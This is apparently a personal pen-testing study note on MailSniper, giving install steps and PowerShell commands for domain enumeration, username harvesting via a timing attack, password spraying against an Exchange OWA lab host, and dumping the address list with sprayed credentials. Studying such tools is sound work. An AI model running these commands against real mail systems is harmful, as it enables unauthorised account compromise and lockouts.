---
creation date: September 22nd 2022
last modified date: September 22nd 2022
aliases: []
tags: #🧰
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #🧰  

# [[MailSniper]]  
___

## Description:
MailSniper is a penetration testing tool for searching through email in a Microsoft Exchange environment for specific terms (passwords, insider intel, network architecture information, etc.).

MailSniper also includes additional modules for password spraying, enumerating users and domains, gathering the Global Address List (GAL) from OWA and EWS and checking mailbox permissions for every Exchange user at an organization.

## Installation
Download [MailSniper](https://github.com/dafthack/MailSniper)

On the **attacker-windows** VM, open PowerShell and import MailSniper.ps1.
`ipmo C:\Tools\MailSniper\MailSniper.ps1`


## Commands
Enumerate the NetBIOS name of the target domain
`Invoke-DomainHarvestOWA -ExchHostname 10.10.15.100`

Validate usernames with timing attack
`Invoke-UsernameHarvestOWA -ExchHostname 10.10.15.100 -Domain CYBER -UserList .\possible-usernames.txt -OutFile valid.txt`

Password Spary 
Can cause lockouts! Too many attempts in a short space of time is not only loud, but may also lock accounts out.
`Invoke-PasswordSprayOWA -ExchHostname 10.10.15.100 -UserList .\valid.txt -Password Summer2021`

Downloading Global Address List with valid creds. respray after list is downloaded
`Get-GlobalAddressList -ExchHostname 10.10.15.100 -UserName CYBER\iyates -Password Summer2021 -OutFile gal.txt`

Go to exchange hostname and log in with valid creds https://exchange-ip-or-hostname/

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: September 22nd 2022 (02:42 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
